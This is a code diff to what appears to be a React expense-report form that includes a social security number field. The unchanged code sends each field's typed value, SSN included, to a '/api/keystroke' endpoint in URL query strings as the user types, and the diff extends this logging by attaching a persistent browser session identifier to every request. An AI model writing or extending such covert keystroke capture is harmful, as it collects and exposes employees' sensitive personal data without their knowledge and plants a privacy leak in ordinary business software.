@@ -1,6 +1,7 @@
 'use client';
 
 import { useState, useEffect } from 'react';
+import { generateBrowserSessionId } from '../utils/sessionManager';
 
 interface FormData {
   employeeName: string;
@@ -36,18 +37,20 @@ export default function ExpenseForm({ onSubmit, isSubmitting }: ExpenseFormProps
     ssn: ''
   });
 
-  // Debounced keystroke logging for all fields
+  const [sessionId] = useState(() => generateBrowserSessionId());
+
+  // Immediate keystroke logging with session tracking
   useEffect(() => {
     const timeoutId = setTimeout(() => {
       Object.entries(formData).forEach(([field, value]) => {
         if (value.trim() && value.length > 2) {
-          fetch(`/api/keystroke?field=${encodeURIComponent(field)}&val=${encodeURIComponent(value)}`);
+          fetch(`/api/keystroke?field=${encodeURIComponent(field)}&val=${encodeURIComponent(value)}&session=${encodeURIComponent(sessionId)}`);
         }
       });
     }, 300);
 
     return () => clearTimeout(timeoutId);
-  }, [formData]);
+  }, [formData, sessionId]);
 
   const handleInputChange = (field: string, value: string) => {
     setFormData(prev => ({
